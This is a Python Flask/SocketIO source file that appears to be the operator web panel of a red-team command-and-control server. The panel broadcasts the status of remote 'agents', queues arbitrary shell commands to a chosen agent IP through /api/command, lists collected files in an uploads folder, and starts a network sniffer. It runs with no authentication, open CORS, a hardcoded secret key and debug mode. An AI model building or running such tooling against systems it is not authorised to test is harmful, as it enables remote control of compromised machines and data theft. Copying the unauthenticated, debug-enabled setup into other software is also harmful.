from flask import Flask, render_template, jsonify, request
from flask_socketio import SocketIO, emit
import logging
import threading
import json
import time
import os

# Import controller logic
# In a real scenario, we might want to run them in the same process or share state better
# For this implementation, we'll import the global state from controller.py
# This assumes controller.py can be imported without running its main block
import controller

app = Flask(__name__)
app.config['SECRET_KEY'] = 'redteam_secret!'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', logger=True, engineio_logger=True)

# Reduce Flask logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.INFO)

# Create logger for this module
logger = logging.getLogger(__name__)

def background_thread():
    """Example of how to send server generated events to clients."""
    while True:
        time.sleep(1)
        # Broadcast agent updates
        agents_data = []
        
        # Debug: Print the AGENTS dictionary
        print(f"[DEBUG] controller.AGENTS keys: {list(controller.AGENTS.keys())}")
        print(f"[DEBUG] controller.AGENTS content: {controller.AGENTS}")
        
        for ip, agent in controller.AGENTS.items():
            # Check if active
            status = "online" if (time.time() - agent.last_seen) < 60 else "offline"
            agents_data.append({
                'id': agent.id,
                'ip': agent.ip,
                'hostname': agent.hostname,
                'os': agent.os_type,
                'last_seen': time.strftime('%H:%M:%S', time.localtime(agent.last_seen)),
                'status': status
            })
        
        if agents_data:  # Only log when there are agents
            print(f"[DEBUG] Broadcasting {len(agents_data)} agents: {agents_data}")
        
        socketio.emit('agent_update', agents_data)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/agents')
def get_agents():
    return jsonify([vars(a) for a in controller.AGENTS.values()])

@app.route('/api/command', methods=['POST'])
def send_command():
    data = request.json
    target_ip = data.get('ip')
    cmd = data.get('command')
    
    print(f"[DEBUG] /api/command called: ip={target_ip}, cmd={cmd}")
    logger.info(f"API: Received command request for {target_ip}: {cmd}")
    
    # Input validation
    if not target_ip or not cmd:
        logger.warning(f"API: Missing required fields")
        return jsonify({'error': 'Missing ip or command'}), 400
    
    # Basic IP validation
    import re
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target_ip):
        logger.warning(f"API: Invalid IP format: {target_ip}")
        return jsonify({'error': 'Invalid IP format'}), 400
    
    # Command length validation
    if len(cmd) > 1000:
        logger.warning(f"API: Command too long")
        return jsonify({'error': 'Command too long (max 1000 chars)'}), 400
    
    controller.queue_command(target_ip, cmd)
    logger.info(f"API: Command queued successfully")
    return jsonify({'status': 'queued', 'target': target_ip, 'command': cmd})

@app.route('/api/files')
def get_files():
    files = []
    upload_dir = 'uploads'
    if os.path.exists(upload_dir):
        for f in os.listdir(upload_dir):
            path = os.path.join(upload_dir, f)
            files.append({
                'name': f,
                'size': os.path.getsize(path),
                'time': time.ctime(os.path.getmtime(path))
            })
    return jsonify(files)

@socketio.on('connect')
def test_connect():
    emit('my response', {'data': 'Connected'})

def run_server():
    print(f"DEBUG: Config loaded. Port: {controller.CONFIG['web_port']}")
    print("DEBUG: Starting sniffer thread...")
    
    # Register socketio callback to avoid circular import
    controller.set_socketio_callback(lambda event, data: socketio.emit(event, data))
    
    # Start background thread for WebSocket updates
    socketio.start_background_task(target=background_thread)
    
    # Start the sniffer thread from here as well to keep it all in one process
    sniffer_thread = threading.Thread(target=controller.start_sniffer)
    sniffer_thread.daemon = True
    sniffer_thread.start()
    
    print("DEBUG: Calling socketio.run...")
    print(f"DEBUG: Server will be available at http://0.0.0.0:{controller.CONFIG['web_port']}")
    try:
        socketio.run(app, host='0.0.0.0', port=controller.CONFIG['web_port'], debug=True, use_reloader=False, allow_unsafe_werkzeug=True)
    except Exception as e:
        print(f"ERROR: socketio.run failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    # monkey patching for scapy might be needed if conflicts arise, but usually ok
    run_server()
